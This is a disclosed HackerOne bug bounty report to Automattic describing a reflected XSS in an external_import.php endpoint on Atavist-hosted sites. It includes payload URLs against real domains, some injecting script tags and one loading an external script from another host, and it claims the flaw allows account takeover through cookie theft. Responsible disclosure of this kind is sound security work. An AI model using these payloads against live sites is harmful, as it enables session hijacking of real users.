# Reflected XSS on a Atavist theme at external_import.php

## Report Details
- **Report ID**: 976657
- **URL**: https://hackerone.com/reports/976657
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-09-08T10:12:34.981Z
- **Disclosed**: 2020-11-18T14:21:52.969Z

## Reporter
- **Username**: bugra
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
## Summary:
Hi team,
I found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called `scripts` on this php file. 
Basically, the endpoint prints value of `scripts` parameter to `<script src='$Value'>`.
So we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs
Or we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

This endpoint is also available on other websites. Like :
https://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E
http://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E

Also there is no secure flag on the session cookie (`periodicSessionatavist`). So this XSS leads to account takeover.

## Impact

Reflected XSS - account takeover via cookie stealing

Thanks,
Bugra

## Attachments
No attachments
